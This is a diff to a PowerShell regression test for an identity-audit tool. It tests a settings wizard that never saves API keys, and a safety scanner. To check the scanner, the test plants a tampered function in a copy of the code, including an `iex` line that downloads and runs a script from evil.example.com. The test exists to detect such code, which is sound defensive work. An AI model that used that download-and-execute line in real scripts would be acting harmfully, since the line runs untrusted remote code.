@@ -16,8 +16,9 @@ $root = Split-Path $PSScriptRoot -Parent
 . (Join-Path $root 'lib\ChecksHost.ps1')
 . (Join-Path $root 'lib\ChecksEntra.ps1')
 . (Join-Path $root 'lib\Compliance.ps1')
+. (Join-Path $root 'lib\Wizard.ps1')
 
-$tmp = Join-Path ([System.IO.Path]::GetTempPath()) "idwolf_regression_$PID"
+$tmp =Join-Path ([System.IO.Path]::GetTempPath()) "idwolf_regression_$PID"
 New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 $script:Failures = 0; $script:Passed = 0
 
@@ -1271,6 +1272,91 @@ Assert-True (@($jlFind | Where-Object { @($_.controls).Count -eq 0 }).Count -eq 
 $jlCsv = @(Import-Csv (Join-Path $tmp 'jl.csv'))
 Assert-True (@($jlCsv | Where-Object { -not $_.Controls }).Count -eq 0) 'csv: Controls column filled'
 
+# ------------------------------------------------------------ wizard: remembered choices, open the report
+Write-Host "[wizard]"
+$oldStateDir = $env:IDWOLF_STATE_DIR
+$oldGeminiKey = $env:GEMINI_API_KEY; $env:GEMINI_API_KEY = $null
+$env:IDWOLF_STATE_DIR = Join-Path $tmp 'state'
+try {
+    $statePath = Get-IDWolfStatePath
+    Assert-True ($statePath -like "$tmp*wizard.json") 'IDWOLF_STATE_DIR moves the remembered-choices file'
+    Save-IDWolfState -Section analyzer -Values @{ Snapshot = 'a.json'; AiMode = 'send'; ApiKey = 'AIzaSECRET'; BundlePassword = 'pw' }
+    $st = Read-IDWolfState
+    Assert-True ($st.analyzer.Snapshot -eq 'a.json' -and $st.analyzer.AiMode -eq 'send' -and -not $st.analyzer.ContainsKey('ApiKey')) 'state keeps listed keys only'
+    Assert-True ([System.IO.File]::ReadAllText($statePath) -notmatch 'AIzaSECRET|BundlePassword') 'an API key or a password never reaches the state file'
+    Save-IDWolfState -Section analyzer -Values @{ AiMode = $null }
+    Assert-True (-not (Read-IDWolfState).analyzer.ContainsKey('AiMode') -and (Read-IDWolfState).analyzer.Snapshot -eq 'a.json') 'a null value removes one key and keeps the others'
+    [System.IO.File]::WriteAllText($statePath, '{ not json')
+    $st = Read-IDWolfState 3>$null
+    Assert-True ($st.analyzer.Count -eq 0 -and $st.launcher.Count -eq 0) 'a damaged state file reads as empty instead of stopping the run'
+    Clear-IDWolfState
+    Assert-True (-not (Test-Path -LiteralPath $statePath)) 'Clear-IDWolfState deletes the file'
+
+    # Opening the report: asked only at a console, .html only, only a file written by this run.
+    $opened = New-Object System.Collections.Generic.List[string]
+    $openFake = { param($p) $opened.Add($p) }
+    $rep = Join-Path $tmp 'open_me.html'; Set-Content -LiteralPath $rep -Value '<html></html>'
+    $exe = Join-Path $tmp 'open_me.exe'; Set-Content -LiteralPath $exe -Value 'x'
+    Assert-True ((Request-OpenReport -Path $rep -Interactive $true -Ask { '' } -Open $openFake) -and $opened.Count -eq 1) 'Enter opens the report (default yes)'
+    Assert-True (-not (Request-OpenReport -Path $rep -Interactive $true -Ask { 'n' } -Open $openFake) -and $opened.Count -eq 1) '"n" does not open it'
+    Assert-True (-not (Request-OpenReport -Path $exe -Interactive $true -Ask { 'y' } -Open $openFake) -and $opened.Count -eq 1) 'a file that is not .html is never opened'
+    Assert-True (-not (Request-OpenReport -Path $rep -Interactive $false -Ask { throw 'asked' } -Open $openFake)) 'no console: not even asked'
+    Assert-True (-not (Request-OpenReport -Path $rep -Since (Get-Date).AddMinutes(5) -Interactive $true -Ask { 'y' } -Open $openFake)) 'a report older than this run is not offered'
+
+    # Settings screen of a full run: edit by number, y/n and A/Z/S normalized, hidden keys not
+    # offered, "-" clears, a bad choice is refused, Enter starts.
+    $answers = New-Object System.Collections.Queue
+    foreach ($x in @('2', 'YES', '3', 'q', '3', 'z', '9', '1', '-', '')) { $answers.Enqueue($x) }
+    $set = [ordered]@{ Tenant = 'contoso.onmicrosoft.com'; Deep = 'n'; Next = 'A'; OutHtml = 'r.html' }
+    $changed = New-Object System.Collections.Generic.List[string]
+    $go = Edit-RunSettings -Settings $set -YesNo @('Deep') -Choices @{ Next = @('A', 'Z', 'S') } `
+        -Visible { param($Key, $S) -not ($Key -eq 'OutHtml' -and $S.Next -ne 'A') } `
+        -OnChange { param($Key, $Value) $changed.Add("$Key=$Value") } -Ask { param($q) $answers.Dequeue() } 6>$null
+    Assert-True ($go -eq $true -and (Edit-RunSettings -Settings ([ordered]@{ A = '1' }) -Ask { 'q' } 6>$null) -eq $false) 'settings screen: Enter starts, Q cancels'
+    Assert-True ($set.Deep -eq 'y' -and $set.Next -eq 'Z' -and $set.Tenant -eq '' -and $set.OutHtml -eq 'r.html' -and $answers.Count -eq 0) "settings screen edits by number, normalizes y/n and A/Z/S, clears with '-', hides what doesn't apply (got $(($set.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ', '))"
+    Assert-True (($changed -join ';') -eq 'Deep=y;Next=Z;Tenant=') "settings screen reports each change once, a refused value not at all (got $($changed -join ';'))"
+
+    # The analyzer wizard end to end, answers piped in (Read-Host reads them; no browser is
+    # offered because input is redirected). Run 1 answers everything, run 2 reuses it.
+    $wizExe = (Get-Process -Id $PID).Path
+    $wizDemo = Join-Path $tmp 'demo.json'
+    $wizHtml = Join-Path $tmp 'wiz1.html'
+    Push-Location $tmp
+    try {
+        $in1 = @($wizDemo, $wizHtml, 'n', 'n', 'n', 'n', 'S', '') -join "`n"
+        $o1 = $in1 | & $wizExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'IDWolf.ps1') 2>&1 | Out-String
+        $st = Read-IDWolfState
+        Assert-True ((Test-Path -LiteralPath $wizHtml) -and $st.analyzer.Snapshot -eq $wizDemo -and $st.analyzer.AiMode -eq 'skip' -and $st.analyzer.LastReport -eq $wizHtml) "wizard run 1 writes the report and remembers snapshot, AI mode and report: $(if (-not (Test-Path -LiteralPath $wizHtml)) { $o1 })"
+        $o2 = (@('', '') -join "`n") | & $wizExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'IDWolf.ps1') 2>&1 | Out-String
+        Assert-True ($o2 -match 'Last analysis: ' -and $o2 -match 'Report written to ' -and $o2 -notmatch 'Snapshot not found') 'wizard run 2 offers the same settings and runs on Enter, Enter'
+        # A key pasted for the AI step is used for that run only.
+        $in3 = @('n', '', '', 'n', 'n', 'n', 'n', 'G', '', 'AIzaFAKEKEY0123456789', '', '', 'n') -join "`n"
+        $o3 = $in3 | & $wizExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'IDWolf.ps1') 2>&1 | Out-String
+        Assert-True ((Read-IDWolfState).analyzer.AiMode -eq 'send' -and [System.IO.File]::ReadAllText($statePath) -notmatch 'AIzaFAKEKEY') "wizard remembers AI mode 'send' but never the pasted key"
+
+        # Launcher: a snapshot collected but never analyzed is offered on the next start.
+        Save-IDWolfState -Section pending -Values @{ Kind = 'ad'; Snapshot = $wizDemo; CollectedAt = '2026-10-15 10:00' } -Replace
+        $lHtml = Join-Path $tmp 'launch1.html'
+        $inL = @('', 'A', $lHtml, '', '', 'n', 'Q') -join "`n"
+        $oL = $inL | & $wizExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'Start-IDWolf.ps1') 2>&1 | Out-String
+        $st = Read-IDWolfState
+        Assert-True ($oL -match 'was never analyzed or packaged' -and (Test-Path -LiteralPath $lHtml) -and -not $st.pending.Snapshot -and $st.launcher.Next -eq 'A') "launcher picks up a pending snapshot, analyzes it and clears it: $(if (-not (Test-Path -LiteralPath $lHtml)) { $oL })"
+        # Full Entra run: the questions, then the settings screen; a change there is remembered,
+        # Q cancels before anything is collected. The next start offers the same run again and
+        # shows the screen without asking the questions.
+        $in8 = @('8', '', '', 'n', 'Z', '2', 'contoso.example', 'Q', 'Q') -join "`n"
+        $o8 = $in8 | & $wizExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'Start-IDWolf.ps1') 2>&1 | Out-String
+        $st = Read-IDWolfState
+        Assert-True ($o8 -match 'Settings:' -and $o8 -match 'Tenant \(empty = sign-in default\)\s+contoso\.example' -and $o8 -match 'Cancelled: nothing collected' -and $o8 -notmatch 'Collect-EntraSnapshot\.ps1 ---' -and $st.launcher.Tenant -eq 'contoso.example' -and $st.launcher.LastRun -eq '8') "full run shows the settings screen, remembers an edit, Q collects nothing: $(if ($o8 -notmatch 'Cancelled: nothing collected') { $o8 })"
+        $oR = (@('', 'Q', 'Q') -join "`n") | & $wizExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'Start-IDWolf.ps1') 2>&1 | Out-String
+        Assert-True ($oR -match 'Last time: full Entra run, tenant contoso\.example' -and $oR -match 'as last time' -and $oR -match 'Settings:' -and $oR -match 'Cancelled: nothing collected') "repeating the last run goes straight to the settings screen: $(if ($oR -notmatch 'Settings:') { $oR })"
+        $oC = (@('n', 'C', 'Q') -join "`n") | & $wizExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'Start-IDWolf.ps1') 2>&1 | Out-String
+        Assert-True ($oC -match 'Remembered choices deleted' -and -not (Test-Path -LiteralPath $statePath)) 'launcher [C] deletes the remembered choices'
+    }
+    finally { Pop-Location }
+}
+finally { $env:IDWOLF_STATE_DIR = $oldStateDir; $env:GEMINI_API_KEY = $oldGeminiKey }
+
 # ------------------------------------------------------------ safety review
 Write-Host "[safety]"
 $safetyOut = & (Join-Path $root 'Test-IDWolfSafety.ps1') -Quiet 6>&1 2>&1 | Out-String
@@ -1278,10 +1364,10 @@ Assert-True ($LASTEXITCODE -eq 0) "safety review passes on the shipped code: $($
 # The review must catch code that writes to AD, downloads, or hides what it runs.
 $tamper = Join-Path $tmp 'tampered'; New-Item -ItemType Directory -Force (Join-Path $tamper 'lib') | Out-Null
 Copy-Item (Join-Path $root '*.ps1') $tamper; Copy-Item (Join-Path $root 'lib\*.ps1') (Join-Path $tamper 'lib')
-Add-Content (Join-Path $tamper 'lib\Common.ps1') "`nfunction Invoke-Helper { Set-ADUser -Identity x -Description y; iex (New-Object Net.WebClient).DownloadString('http://evil.example.com/p'); Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/users'; Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{} }"
+Add-Content (Join-Path $tamper 'lib\Common.ps1') "`nfunction Invoke-Helper { Set-ADUser -Identity x -Description y; iex (New-Object Net.WebClient).DownloadString('http://evil.example.com/p'); Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/users'; Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{}; Invoke-Item -LiteralPath x.exe }"
 $tamperOut = & (Join-Path $tamper 'Test-IDWolfSafety.ps1') -Quiet 6>&1 2>&1 | Out-String
 $tamperExit = $LASTEXITCODE
-Assert-True ($tamperExit -eq 1 -and $tamperOut -match 'Set-ADUser changes the directory' -and $tamperOut -match 'iex is not allowed' -and $tamperOut -match 'evil\.example\.com' -and $tamperOut -match 'not a GET' -and $tamperOut -match 'not a registry read') 'safety review catches an AD write, iex, a download, a Graph POST and a registry write over CIM'
+Assert-True ($tamperExit -eq 1 -and $tamperOut -match 'Set-ADUser changes the directory' -and $tamperOut -match 'iex is not allowed' -and $tamperOut -match 'evil\.example\.com' -and $tamperOut -match 'not a GET' -and $tamperOut -match 'not a registry read' -and $tamperOut -match 'Invoke-Item outside lib') 'safety review catches an AD write, iex, a download, a Graph POST, a registry write over CIM and Invoke-Item outside the report opener'
 
 Remove-Item -Recurse -Force $tmp
 Write-Host ""
